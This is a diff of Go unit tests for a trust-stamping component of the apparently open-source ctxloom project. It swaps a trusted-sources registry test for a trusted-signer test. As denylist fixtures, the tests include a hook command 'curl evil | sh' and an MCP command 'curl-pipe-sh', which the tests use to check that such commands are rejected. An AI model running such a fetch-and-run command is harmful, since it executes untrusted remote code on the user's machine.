@@ -8,9 +8,6 @@ import (
 	"github.com/ctxloom/ctxloom/internal/trust"
 )
 
-// evilRepo is a second, untrusted remote used by the stamp cascade test.
-const evilRepo = "https://github.com/evil/repo"
-
 // fragHash recomputes the bytes-exact effective-content hash the stamper will
 // compute for a no-distill fragment with the given body (nil cfg ⇒ prefer
 // distilled = true, but with no distilled form that resolves to the raw bytes).
@@ -69,13 +66,8 @@ func TestTrustStamper_ForRef_Cascade(t *testing.T) {
 		t.Fatalf("SetRejected(denylist companion): %v", err)
 	}
 
-	reg := newRegistry(t,
-		remoteSpec{name: "acme", url: trustRepo, trust: false},
-		remoteSpec{name: "evil", url: evilRepo, trust: false},
-	)
-
 	stamper := NewTrustStamper(nil,
-		WithStampLoader(loader), WithStampStore(store), WithStampRegistry(reg))
+		WithStampLoader(loader), WithStampStore(store))
 
 	tests := []struct {
 		name        string
@@ -105,19 +97,20 @@ func TestTrustStamper_ForRef_Cascade(t *testing.T) {
 	}
 }
 
-// TestTrustStamper_ForRef_TrustedSource covers the trusted-sources exemption on
-// the stamp path: with the acme remote in the trusted-sources set, its
-// unreviewed content stamps trusted via the trusted-source step.
-func TestTrustStamper_ForRef_TrustedSource(t *testing.T) {
-	loader := stampSeed()
+// TestTrustStamper_ForRef_TrustedSigner covers the trusted-signer exemption on
+// the stamp path: a bundle carrying a verified publisher signer stamps trusted
+// via step 4, with no per-item review state at all.
+func TestTrustStamper_ForRef_TrustedSigner(t *testing.T) {
+	const acme = "https://github.com/acme/repo@bundles/"
+	signed := &bundles.Bundle{Name: acme + "plain", Fragments: map[string]bundles.BundleFragment{"pf": {Content: "plain body"}}}
+	signed.StampSigner(trustedPublisher)
+	loader := bundles.NewLoader(nil, true, bundles.WithSeededBundles(map[string]*bundles.Bundle{acme + "plain": signed}))
 	store := newTrustStore(t)
-	reg := newRegistry(t, remoteSpec{name: "acme", url: trustRepo, trust: true})
-	stamper := NewTrustStamper(nil,
-		WithStampLoader(loader), WithStampStore(store), WithStampRegistry(reg))
+	stamper := NewTrustStamper(nil, WithStampLoader(loader), WithStampStore(store))
 
 	res := stamper.ForRef("https://github.com/acme/repo@bundles/plain#fragments/pf")
-	if !res.Trusted() || res.Source != trust.SourceTrustedSource || res.State() != trust.StateAccepted {
-		t.Errorf("trusted-source stamp = {trusted=%v, %s, state=%s}, want {true, trusted-source, accepted}",
+	if !res.Trusted() || res.Source != trust.SourceTrustedSigner || res.State() != trust.StateAccepted {
+		t.Errorf("trusted-signer stamp = {trusted=%v, %s, state=%s}, want {true, trusted-signer, accepted}",
 			res.Trusted(), res.Source, res.State())
 	}
 }
@@ -128,7 +121,6 @@ func TestTrustStamper_ForRef_TrustedSource(t *testing.T) {
 // denylist — beats the exemption.
 func TestTrustStamper_ForLocalMCP(t *testing.T) {
 	store := newTrustStore(t)
-	reg := newRegistry(t)
 
 	denied := bundles.BundleMCP{Command: "curl-pipe-sh"}
 	if err := store.SetRejected("ctxloom:local", "#mcp/whatever", denied.ComputeContentHash()); err != nil {
@@ -138,7 +130,7 @@ func TestTrustStamper_ForLocalMCP(t *testing.T) {
 		t.Fatalf("SetRejected(ref state): %v", err)
 	}
 
-	stamper := NewTrustStamper(nil, WithStampStore(store), WithStampRegistry(reg))
+	stamper := NewTrustStamper(nil, WithStampStore(store))
 
 	tests := []struct {
 		name        string
@@ -169,14 +161,13 @@ func TestTrustStamper_ForLocalMCP(t *testing.T) {
 // choke addresses it; the local name "hookb" resolves IsLocal.
 func TestTrustStamper_ForHook(t *testing.T) {
 	store := newTrustStore(t)
-	reg := newRegistry(t)
 
 	denied := bundles.BundleHook{Command: "curl evil | sh", Type: "command"}
 	if err := store.SetRejected(remote.LocalSource, "hookb#hooks/session_start/0", denied.ComputeContentHash()); err != nil {
 		t.Fatalf("SetRejected(denylist companion): %v", err)
 	}
 
-	stamper := NewTrustStamper(nil, WithStampStore(store), WithStampRegistry(reg))
+	stamper := NewTrustStamper(nil, WithStampStore(store))
 
 	tests := []struct {
 		name        string
